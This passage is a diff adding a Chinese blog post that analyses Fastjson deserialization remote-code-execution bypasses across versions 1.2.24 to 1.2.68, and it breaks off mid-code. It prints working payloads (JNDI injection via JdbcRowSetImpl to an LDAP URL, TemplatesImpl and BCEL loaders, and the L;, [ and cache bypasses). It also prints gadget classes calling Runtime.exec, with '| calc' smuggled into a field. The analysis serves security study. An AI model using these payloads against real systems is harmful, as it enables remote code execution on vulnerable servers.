@@ -147,6 +147,248 @@
       </tags>
   </entry>
   <entry>
+    <title>fastjson 看我一命通关</title>
+    <url>/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/</url>
+    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​        Fastjson是一款由阿里巴巴开发的高性能、功能丰富的 JSON 处理库，用于实现Java 对象和 JSON 字符串的转换。而Fastjson组件提供的反序列化功能，允许用户通过”@type” 字段来指定任意反序列化类名，并自动调用该类的 setter 方法及部分 getter 方法，这就导致当反序列化不可信数据时便可触发远程代码执行。</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson -1.2.24"></a>fastjson -1.2.24</h2><p>影响版本：fastjson &lt;&#x3D; 1.2.24</p>
+<p>主要利用方式为：</p>
+<ul>
+<li>JdbcRowSetImpl 结合JNDI注入</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>TemplatesImpl 动态加载字节码</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;_bytecodes&quot;</span>: [<span class="string">&quot;yv66vgAAADQA...CJAAk=&quot;</span>],</span><br><span class="line">	<span class="string">&quot;_name&quot;</span>: <span class="string">&quot;S1nJa&quot;</span>,</span><br><span class="line">	<span class="string">&quot;_tfactory&quot;</span>: &#123;&#125;,</span><br><span class="line">	<span class="string">&quot;_outputProperties&quot;</span>: &#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>BasicDataSource 不出网利用</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;x&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>,</span><br><span class="line">                <span class="string">&quot;driverClassLoader&quot;</span>: &#123;</span><br><span class="line">                    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&quot;driverClassName&quot;</span>: <span class="string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;: <span class="string">&quot;x&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体利用过程就不在赘述了，主要看下其他版本的绕过方式和利用思路。</p>
+<h2 id="fastjson-1-2-25"><a href="#fastjson-1-2-25" class="headerlink" title="fastjson -1.2.25"></a>fastjson -1.2.25</h2><p>在1.2.25版本中，官方引入了一个安全机制<code>checkAutoType</code>，主要进行了黑白名单检测，上述利用方式都被加入到了黑名单中</p>
+<ul>
+<li>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.41</li>
+<li>autotype：开启</li>
+</ul>
+<h3 id="checkAutoType"><a href="#checkAutoType" class="headerlink" title="checkAutoType"></a>checkAutoType</h3><p>其中有这三个属性，分别代表是否开启checkAutoType和黑白名单，autoTypeSupport默认为false</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023144815106.png" alt="image-20231023144815106"></p>
+<p>接着就看下<code>checkAutoType</code>具体做了什么，之前的版本中是通过TypeUtils.loadClass直接加载我们传入的类，并通过deserialze进行反序列化</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023140209718.png" alt="image-20231023140209718"></p>
+<p>1.2.25开始加入了checkAutoType进行安全检测</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023140809796.png" alt="image-20231023140809796"></p>
+<h4 id="开启AutoType"><a href="#开启AutoType" class="headerlink" title="开启AutoType"></a>开启AutoType</h4><p>开启autoType的模式下先进行白名单检测如果有就直接加载，没有在进行黑名单检测，不在黑名单的话会从mapping缓存中查找</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023145135164.png" alt="image-20231023145135164"></p>
+<p>最后如果还没有则会直接加载</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="关闭AutoType"><a href="#关闭AutoType" class="headerlink" title="关闭AutoType"></a>关闭AutoType</h4><p>关闭的逻辑是先黑再白，如果还是找不到就抛出异常</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023145554242.png" alt="image-20231023145554242"></p>
+<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>JdbcRowSetImpl、TemplatesImpl、BCEL(sun包下的所有内容)都被加入了黑名单，看似无法再使用，但在loadClass的逻辑中发现这么一段代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果类名以L 开头; 结尾，则会递归的去除该符号，而这就出现了一个逻辑漏洞，<code>com.sun.*</code>被加入了黑名单，但是<code>Lcom.sun.*;</code>并没有，利用这个机制就可以绕过黑名单检测</p>
+<p>而这需要开启autotype，在上边的逻辑中有提到，如果黑白名单和mapping缓存中都没有该类则会调用如下代码直接加载</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>若没有开启autotype黑白名单中没有则会直接抛出异常</p>
+<p>最终的 payload 在类名前后加上<code>L</code>和<code>;</code>即可：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson -1.2.42"></a>fastjson -1.2.42</h2><ul>
+<li>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.42</li>
+<li>autotype：开启</li>
+</ul>
+<p>自1.2.42开始，checkAutoType做了两个变化：</p>
+<p>1、黑名单采用hash形式，防止安全人员对其研究。不过很多都已经被师傅们撞出来了:<a href="https://github.com/LeadroyaL/fastjson-blacklist">LeadroyaL&#x2F;fastjson-blacklist (github.com)</a></p>
+<img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023151856492.png" alt="image-20231023151856492" style="zoom: 67%;">
+
+<p>2、在开头部分加了L和;判断</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023152207413.png" alt="image-20231023152207413"></p>
+<p>这种方式只是表面上防止了L开头;结尾的情况，但loadClass中的逻辑是递归解析，所以这里双写绕过即可：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson -1.2.43"></a>fastjson -1.2.43</h2><ul>
+<li>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.43</li>
+<li>autotype：开启</li>
+</ul>
+<p>自1.2.43开始，又对之前的漏洞进行了修复，这次修复的方式为：如果出现LL则直接抛出异常</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023153431821.png" alt="image-20231023153431821"></p>
+<p>但loadClass中还有另一段逻辑：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">    Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">    <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果以[开头，也会进行截断解析，所以便可构造Payload：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但遇到报错:</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023160059692.png" alt="image-20231023160059692"></p>
+<h3 id="畸形payload"><a href="#畸形payload" class="headerlink" title="畸形payload"></a>畸形payload</h3><p>上边报错希望42行的位置是[，但却是逗号，所以加上[</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行后报错希望43行为{</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023161826856.png" alt="image-20231023161826856"></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在成功运行了</p>
+<p>分析下原因，先看下逗号前添加 “[“ 的逻辑</p>
+<p>在deserialze中先获取ComponentType型的数据，这个数据就是截取”[“后的实体类，接着调用parseArray进行解析</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023163713012.png" alt="image-20231023163713012"></p>
+<p>先获取token，如果值不是14就会抛出刚才的异常</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023164100641.png" alt="image-20231023164100641"></p>
+<p>所以问题在于前边解析lexer中token的时候发生的，逻辑就在DefaultJSONParser中，lexer是fastjson中的一个词法解析器，它希望下一次解析内容为<code>JSONToken.COMMA</code>也就是逗号前的内容</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023164600475.png" alt="image-20231023164600475"></p>
+<p>之后如果逗号前的内容是[，就会返回token值14，便不再会抛出异常</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023165046308.png" alt="image-20231023165046308"></p>
+<p>逗号前是”{“同理，逻辑在JavaBeanDeserializer#deserialze，可以自行分析下</p>
+<p>所以最终的payload为：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,</span><br><span class="line">	<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">	<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但该漏洞在1.2.44修复了，修复方式仍然是黑名单抛异常</p>
+<h2 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson -1.2.47"></a>fastjson -1.2.47</h2><p>在 fastjson 不断迭代到 1.2.47 时，爆出了最为严重的漏洞—Cache通杀，可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。</p>
+<p>影响版本：<code>1.2.25 &lt;= fastjson &lt;= 1.2.32 未开启 AutoTypeSupport</code></p>
+<p>影响版本：<code>1.2.33 &lt;= fastjson &lt;= 1.2.47</code></p>
+<p>autotype：1.2.32前关闭，1.2.33—1.2.47均可</p>
+<p>到此黑名单已经设置的比较严格了，在 autoTypeSupport 为默认的 false 时，程序直接检查黑名单并抛出异常，没有其它的绕过方式，于是思路就转变到了在判断autoTypeSupport 前找调用链</p>
+<h3 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h3><p>autoTypeSupport 前有两个可以加载类的部分，分别是从mappings缓存和deserializers中获取</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023180320857.png" alt="image-20231023180320857"></p>
+<p>先看下deserializers是否可控，它是一个IdentityHashMap对象，对其进行赋值的函数有</p>
+<ul>
+<li><code>getDeserializer()</code>：这个类用来加载一些特定类，以及有 <code>JSONType</code> 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。</li>
+<li><code>initDeserializers()</code>：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。</li>
+<li><code>putDeserializer()</code>：被前两个函数调用，我们无法控制入参。</li>
+</ul>
+<p>因此就无法通过修改deserializers的方式获取类了，接着看哪里能赋值<code>mappings</code>，于是找到了TypeUtils的loadClass，当cache为true时就会将传入的className存储到mappings中</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023181153428.png" alt="image-20231023181153428"></p>
+<p>而在MiscCodec的deserialze有对应的调用，会把strVal存入mappings中</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023181457849.png" alt="image-20231023181457849"></p>
+<p>所以接下来的任务就是：</p>
+<ol>
+<li>找到某个类调用MiscCodec#deserialze</li>
+<li>判断strVal是否可控</li>
+</ol>
+<h4 id="MiscCodec-deserialze"><a href="#MiscCodec-deserialze" class="headerlink" title="MiscCodec#deserialze"></a>MiscCodec#deserialze</h4><p>在fastjson执行反序列化前，会调用<code>getDeserializer()</code>寻找适合的反序列化器</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023182235940.png" alt="image-20231023182235940"></p>
+<p>而反序列化器是从deserializers获取的，deserializers又在初始化中添加了MiscCodec这个类，所以只需要我们传入的类为Class.class即可，即：<code>&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;a&quot;:&quot;aaa&quot;&#125;</code></p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023182407922.png" alt="image-20231023182407922"></p>
+<h4 id="strVal"><a href="#strVal" class="headerlink" title="strVal"></a>strVal</h4><p>strVal的值是objVal赋过去的，而objVal的值则是解析json中的val属性的值</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023183156083.png" alt="image-20231023183156083"></p>
+<p>现在这样就能将JdbcRowSetImpl类存到mappings中</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">    <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于fastjson是循环解析json数据，所以只需要在构造一段触发恶意类的json数据即可，payload：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line">		<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">		<span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line">		<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">		<span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://127.0.0.1:9999/Exec&quot;</span>,</span><br><span class="line">		<span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-32"><a href="#1-2-32" class="headerlink" title="1.2.32"></a>1.2.32</h3><p>1.2.32前需要关闭autotype才能执行，原因在于自1.2.33开始，当开启autotype之后，进行黑名单检测时如果检测到黑名单类并不会直接抛出异常，而是还会从mappings缓存中查找，如果都没有才会抛出异常</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023185727882.png" alt="image-20231023185727882"></p>
+<p>而在1.2.32中没有该逻辑，如果匹配到黑名单则直接抛出异常</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231023190033359.png" alt="image-20231023190033359"></p>
+<h2 id="fastjson-1-2-68"><a href="#fastjson-1-2-68" class="headerlink" title="fastjson -1.2.68"></a>fastjson -1.2.68</h2><p>影响版本：fastjson &lt;&#x3D; 1.2.68</p>
+<p>autotype：均可</p>
+<p>在1.2.47之后，官方把MiscCodec中调用loadClass的地方cache默认设为了false，并且TypeUtils的loadClass也默认设为了false，cache加载恶意类的方式便不再适用</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231024135921385.png" alt="image-20231024135921385"></p>
+<p>在1.2.68中又提出了一个新的 autoType 绕过思路：利用 expectClass 绕过 <code>checkAutoType()</code>。</p>
+<p>在 <code>checkAutoType()</code> 函数中有这样的逻辑：如果函数有 <code>expectClass</code> 入参，且我们传入的类名是 <code>expectClass</code> 的子类或实现，并且不在黑名单中，就可以通过 <code>checkAutoType()</code> 的安全检测。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>所以接下来就需要寻找哪里调用<code>checkAutoType()</code>，并且调用时有expectClass作为入参，最终找到了这两个类</p>
+<ul>
+<li><p><code>ThrowableDeserializer#deserialze()</code></p>
+</li>
+<li><p><code>JavaBeanDeserializer#deserialze()</code></p>
+</li>
+</ul>
+<h3 id="ThrowableDeserializer"><a href="#ThrowableDeserializer" class="headerlink" title="ThrowableDeserializer"></a>ThrowableDeserializer</h3><p>expectClass入参为Throwable</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025151432003.png" alt="image-20231025151432003"></p>
+<p>如果传入的类是Throwable的子类或者实现类，就可以绕过checkAutoType检测，获取class</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025152333512.png" alt="image-20231025152333512"></p>
+<p>并且由于是Throwable的子类，在<code>getDeserializer()</code>获取反序列化器时，也能拿到ThrowableDeserialize反序列化器，最终出发对应的ThrowableDeserializer#deserialze()</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025152611523.png" alt="image-20231025152611523"></p>
+<p>gadget</p>
+<p>Exception是Throwable的子类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String domain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExecException</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDomain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDomain</span><span class="params">(String domain)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.domain = domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMessage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;ping &quot;</span> + domain&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>poc</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;payloads.fastjson.ExecException&quot;</span>,</span><br><span class="line">  <span class="string">&quot;domain&quot;</span>: <span class="string">&quot;S1nJa.com | calc&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="JavaBeanDeserializer"><a href="#JavaBeanDeserializer" class="headerlink" title="JavaBeanDeserializer"></a>JavaBeanDeserializer</h3><p>在<code>getDeserializer()</code>获取反序列化器时，如果找不到合适的反序列化器,会调用最后的<code>createJavaBeanDeserializer()</code>，创建JavaBeanDeserializer进行反序列化</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025153147913.png" alt="image-20231025153147913"></p>
+<p>在TypeUtils#addBaseClassMappings(),发现白名单中有个AutoCloseable，经调试他会获取JavaBeanDeserializer反序列化器</p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025153311274.png" alt="image-20231025153311274"></p>
+<p>而他的expectClass是可控的，就是在经过的ParserConfig#checkAutoType后得到的clazz值，而如果我们传入</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;payloads.fastjson.ExecCloseable&quot;</span>,</span><br><span class="line">  <span class="string">&quot;domain&quot;</span>: <span class="string">&quot;S1nJa.com | calc&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到的expectClass就是<code>java.lang.AutoCloseable</code></p>
+<p><img src="/2023/11/10/fastjson%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/image-20231025153904376.png" alt="image-20231025153904376"></p>
+<p>所以就可以构造，实现java.lang.AutoCloseable接口的子类可以绕过autotype反序列化</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Closeable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExecCloseable</span> <span class="keyword">implements</span> <span class="title class_">Closeable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String domain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExecCloseable</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExecCloseable</span><span class="params">(String domain)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.domain = domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDomain</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;ping &quot;</span> + domain&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDomain</span><span class="params">(String domain)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.domain = domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 